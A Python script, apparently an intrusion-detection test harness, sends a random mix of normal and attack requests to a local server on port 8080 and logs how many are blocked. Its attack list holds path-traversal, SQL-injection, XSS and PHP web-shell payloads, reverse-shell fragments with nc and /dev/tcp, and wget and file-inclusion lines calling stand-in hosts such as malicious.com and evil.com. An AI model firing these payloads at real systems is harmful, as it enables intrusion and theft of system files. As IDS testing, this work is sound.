import requests
import time
import random
import logging

# 配置日志
logging.basicConfig(filename='ids_test.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# 正常请求和攻击请求示例
normal_requests = [
    "http://localhost:8080/?search=hello",
    "http://localhost:8080/?search=test",
    "http://localhost:8080/?page=home",
    "http://localhost:8080/?page=about",
    "http://localhost:8080/?id=1234",
    "http://localhost:8080/?query=example"
]

attack_requests = [
    "http://localhost:8080/whois_raw.cgi?fqdn=%0acat%20/etc/passwd",
    "http://localhost:8080/faxsurvey?/bin/cat%20/etc/passwd",
    "http://localhost:8080/?file=../../../../etc/passwd",
    "http://localhost:8080/?cmd=wget http://malicious.com",
    "http://localhost:8080/?search=<script>alert('XSS')</script>",
    "http://localhost:8080/?id=1' OR '1'='1",
    "http://localhost:8080/?page=login&user=admin'--",
    "http://localhost:8080/?q=<img src=x onerror=alert('XSS')>",
    "http://localhost:8080/?file=file:///etc/passwd",
    "http://localhost:8080/?cmd=nc -e /bin/sh",
    "http://localhost:8080/?php=<?php system($_GET['cmd']); ?>",
    "http://localhost:8080/?search=1' AND '1'='1",
    "http://localhost:8080/?q=../etc/passwd",
    "http://localhost:8080/?q=../../../../../../etc/shadow",
    "http://localhost:8080/?ldap=*)(|(cn=*)",
    "http://localhost:8080/?sql=xp_cmdshell",
    "http://localhost:8080/?shell=| /bin/bash -i >& /dev/tcp/",
    "http://localhost:8080/?include=http://malicious.com/shell.txt",
    "http://localhost:8080/?union=' UNION SELECT null, version() --",
    "http://localhost:8080/?load=<body onload=alert('XSS')>",
    "http://localhost:8080/?cmd=`wget http://malicious.com`",
    "http://localhost:8080/?union=UNION ALL SELECT",
    "http://localhost:8080/?iframe=<iframe src=javascript:alert('XSS')>",
    "http://localhost:8080/?nc=| nc -e /bin/bash",
    "http://localhost:8080/?sql=' AND 1=1 --",
    "http://localhost:8080/?link=<link rel=stylesheet href=javascript:alert('XSS')>",
    "http://localhost:8080/?include=http://example.com/shell.txt?",
    "http://localhost:8080/?sql=1' AND '1'='1",
    "http://localhost:8080/?cookie=<script>alert(document.cookie)</script>",
    "http://localhost:8080/?bash=; /bin/bash -c",
    "http://localhost:8080/?sql=; EXEC xp_cmdshell",
    "http://localhost:8080/?path=../../../windows/system32/cmd.exe",
    "http://localhost:8080/?ldap=*)(objectClass=*",
    "http://localhost:8080/?union=UNION SELECT NULL, NULL",
    "http://localhost:8080/?shell=| bash -i >& /dev/tcp/",
    "http://localhost:8080/?include=http://example.com/shell.php",
    "http://localhost:8080/?sql=' OR 'a'='a",
    "http://localhost:8080/?xss=<style>@import'javascript:alert('XSS')'</style>",
    "http://localhost:8080/?bash=; /bin/bash -i > /dev/tcp/",
    "http://localhost:8080/?sql=' OR ''='",
    "http://localhost:8080/?img=<img src=\"javascript:alert('XSS')\">",
    "http://localhost:8080/?include=http://evil.com/shell.pl",
    "http://localhost:8080/?sql=OR 1=1",
    "http://localhost:8080/?svg=<svg onload=alert('XSS')>"
]

def send_request(url):
    try:
        start_time = time.time()
        response = requests.get(url)
        end_time = time.time()
        response_time = end_time - start_time
        logging.info(f"URL: {url}, Status Code: {response.status_code}, Response Time: {response_time:.4f} seconds")
        return response.status_code, response_time
    except requests.RequestException as e:
        logging.error(f"Failed to send request to {url}: {e}")
        print(f"Failed to send request to {url}: {e}")
        return None, None

def main():
    num_requests = 50
    attack_probability = 0.5  # 50% 概率发送攻击请求

    total_requests = 0
    total_response_time = 0
    attack_detected = 0

    for _ in range(num_requests):
        if random.random() < attack_probability:
            url = random.choice(attack_requests)
        else:
            url = random.choice(normal_requests)

        status_code, response_time = send_request(url)
        if status_code and response_time is not None:
            total_requests += 1
            total_response_time += response_time
            if status_code == 403:  # 假设 403 表示检测到攻击
                attack_detected += 1

        # 等待一段时间再发送下一个请求，避免服务器过载
        time.sleep(random.uniform(0.1, 1.0))

    average_response_time = total_response_time / total_requests if total_requests else 0
    detection_rate = attack_detected / num_requests if num_requests else 0

    logging.info(f"Total Requests: {total_requests}")
    logging.info(f"Average Response Time: {average_response_time:.4f} seconds")
    logging.info(f"Attack Detection Rate: {detection_rate:.2%}")

if __name__ == "__main__":
    main()
